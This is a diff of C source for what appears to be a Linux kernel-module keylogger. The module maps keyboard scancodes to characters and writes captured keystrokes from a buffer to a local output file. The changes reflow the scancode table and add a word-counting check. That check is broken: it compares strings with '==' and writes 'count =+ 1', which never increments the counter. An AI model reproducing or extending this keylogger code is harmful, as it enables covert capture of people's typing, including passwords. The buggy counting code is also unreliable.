@@ -6,6 +6,7 @@
 #include <linux/interrupt.h>
 #include <asm/io.h>
 #include <linux/mutex.h>
+//#include <sharedVariable.h>
 
 #ifndef __KERNEL__
 #define __KERNEL__
@@ -23,6 +24,8 @@ int shiftPressed = 0;
 #define OUTPUT_MODE 0644
 const char* path = "./output.txt"; //temporary
 struct file *outfile;
+int count = 0;
+//char* path;
 
 // character buffer constants
 #define B_SIZE 1000
@@ -47,15 +50,18 @@ const char *scancodes[][2] = {
   {"9", "("}, {"0", ")"}, {"-","_"}, {"=", "+"}, {"/b", "/b"},
   {"/t", "/t"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r","R"}, {"t", "T"},
   {"y", "Y"}, {"u", "U"}, {"i","I"}, {"o", "O"}, {"p", "P"}, {"[", "{"},
-  {"]", "}"}, {"/n", "/n"}, {"LCtrl", "LCtrl"}, {"a", "A"}, {"s", "S"}, {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, {"l", "L"},
+  {"]", "}"}, {"/n", "/n"}, {"LCtrl", "LCtrl"}, {"a", "A"}, {"s", "S"}, {"d", "D"},
+  {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, {"l", "L"},
   {";", ":"}, {"\'", "\""}, {"`", "~"},{"LShift", "LShift"}, {"\\", "|"},
   {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"},
   {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"RShift", "RShift"},
-  {"PrtScn", "KeyPad"},{"LAlt", "LAlt"}, {" ", " "}, {"CapsLock", "CapsLock"},  {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, 
+  {"PrtScn", "KeyPad"},{"LAlt", "LAlt"}, {" ", " "}, {"CapsLock", "CapsLock"},
+  {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, 
   {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"},
   {"NumLock", "NumLock"}, {"ScrollLock", "ScrollLock"}, {"Keypad-7", "Home"},
   {"Keypad-8", "Up"}, {"Keypad-9", "PgUp"},{"-", "-"}, {"Keypad-4", "Left"},
-  {"Keypad-5", "Keypad-5"},{"Keypad-6", "Right"}, {"+", "+"}, {"Keypad-1", "End"},    {"Keypad-2", "Down"}, {"Keypad-3", "PgDn"}, {"Keypad-0", "Ins"}, 
+  {"Keypad-5", "Keypad-5"},{"Keypad-6", "Right"}, {"+", "+"}, {"Keypad-1", "End"},
+  {"Keypad-2", "Down"}, {"Keypad-3", "PgDn"}, {"Keypad-0", "Ins"}, 
   {"Keypad-", "Del"}, {"Alt-SysRq", "Alt-SysRq"}, {"\0", "\0"},{"\0", "\0"},
   {"F11", "F11"}, {"F12", "F12"} };                                
 
@@ -150,8 +156,12 @@ void write_buffer_to_output(int n)
 	while (i < max_size)
 	{
 		writeToFile(outfile, 0, char_buffer[i], 1);
+		if(char_buffer[i]  == " " || char_buffer[i] == "/L"){
+		  count =+ 1;
+		}
 		i++;
 	}
+
 }
   
 MODULE_LICENSE("GPL");
